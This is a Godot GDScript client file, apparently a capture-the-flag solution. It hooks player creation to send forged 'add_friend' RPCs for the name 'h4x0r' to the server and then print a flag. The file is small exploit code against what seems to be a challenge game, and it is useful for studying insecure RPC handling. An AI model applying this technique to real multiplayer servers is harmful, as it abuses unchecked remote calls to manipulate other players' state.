extends Node

var visible := false

puppet func playerlist(list: Array):
	for entry in list:
		create_player(entry[0], entry[1], entry[2])

puppet func create_player(id: int, name: String, teamid: int):
	var player = preload("res://player.tscn").instance()
	player.name = str(id)
	player.player_name = name
	player.teamid = teamid
	add_child(player)
	
	var connection = Node.new()
	connection.set_script(load("res://connection.gd"))
	connection.name = str(id)
	get_parent().add_child(connection)
	get_parent().logging(get_parent().INFO, "Exploit:" + name + ".add_friend(h4x0r)")
	connection.rpc_id(1, "add_friend", "h4x0r")
	get_parent().add_friend(name)
	get_parent().print_flag(name)

puppet func delete_player(id: int):
	pass

puppet func create_projectile(_name: String, _position: Vector3, _pitch: float, _yaw: float, _teamid: int):
	pass

puppet func set_points(_team: int, _points: int):
	pass
